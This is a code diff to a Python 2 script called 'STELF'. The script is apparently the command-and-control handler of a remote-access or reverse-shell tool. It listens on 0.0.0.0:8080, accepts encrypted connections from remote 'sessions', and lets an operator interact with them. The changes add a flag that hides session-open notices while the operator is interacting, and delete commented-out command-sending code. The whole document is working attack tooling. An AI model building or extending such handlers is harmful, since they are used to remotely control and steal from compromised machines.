@@ -56,7 +56,7 @@ class Client:
 		print "starting interaction"
 		while True:
 			try:
-				user_input = raw_input(u"\n" + unicode(self.prompt, errors='replace') + " ")
+				user_input = raw_input(u"\n" + unicode(self.prompt, errors='ignore') + " ")
 			except KeyboardInterrupt:
 			    print ""
 			    break
@@ -92,6 +92,7 @@ class Handler:
 		self.prompt = self.cwd + ">>"
 		self.server_sock = socket.socket()
 		self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		self.interacting = False
 
 		self.server_sock.bind((self.bind, self.port))
 		self.server_sock.listen(5)
@@ -124,10 +125,6 @@ class Handler:
 		print "\n\rBye Bye!"
 		self.server_sock.close()
 		sys.exit(0)
-
-	#def send_cmd(self, command):
-	#	self.commands.append(command)
-	#	self.client_socket.sendall(self.encrypt(command))
 		
 	def accept_clients(self):
 		while True:
@@ -137,11 +134,11 @@ class Handler:
 			c = Client(len(self.clients), client, addr[0], addr[1], key, IV)
 			self.clients.append(c)
 			
-			
-			sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
-			print "STELF session "+str(c.id)+" opened ("+c.address+":"+str(c.port)+" -> "+self.bind+":"+str(self.port)+")\n"
-			sys.stdout.write('handler>> ' + readline.get_line_buffer())
-			sys.stdout.flush()
+			if not self.interacting:
+				sys.stdout.write('\r'+' '*(len(readline.get_line_buffer())+2)+'\r')
+				print "[*]STELF session "+str(c.id)+" opened ("+c.address+":"+str(c.port)+" -> "+self.bind+":"+str(self.port)+")\n"
+				sys.stdout.write('handler>> ' + readline.get_line_buffer())
+				sys.stdout.flush()
 			
 	def start(self):
 		print "[*] STELF HAS STARTED BABY"
@@ -163,43 +160,15 @@ class Handler:
 			elif user_input.startswith("interact") or user_input.split()[0] == "i":
 				try:
 					req_id = int(user_input.split()[1])
+					self.interacting = True
 					self.clients[req_id].interact()
+					self.interacting = False
 				except Exception as e:
+					self.interacting = False
 					print e
 					
 			elif user_input == "exit":
 				sys.exit("\n[*]User requested shutdown.")
-
-
-
-	# def interface(self):
-		# print "[*] Connection established! "
-		# while True:
-			# user_input = raw_input("\n" + self.prompt + " ")
-			# if user_input == "help":
-				# print "Available commands:\n prompt - change prompt"
-			# else:
-				# try:
-					# self.send_cmd(user_input)
-					# data = self.client_socket.recv(4096)		
-					# if not data: raise Exception("[-] Client Disconnected")
-				
-					# data = self.decrypt(data)
-				
-					# data_package = json.loads(data)
-					# for key in data_package:
-						# data_package[key] = base64.b64decode(data_package[key])
-			
-					# self.make_prompt(data_package)
-			
-					# sys.stdout.write(data_package["data"])
-				
-				# except Exception as e:
-						# print "Something went wrong" 
-						# print "[-] Broken pipe..."
-						# print "[*] Attempting reconnection"
-						# break
-
 							
 handler = Handler("0.0.0.0", 8080)
 handler.start()
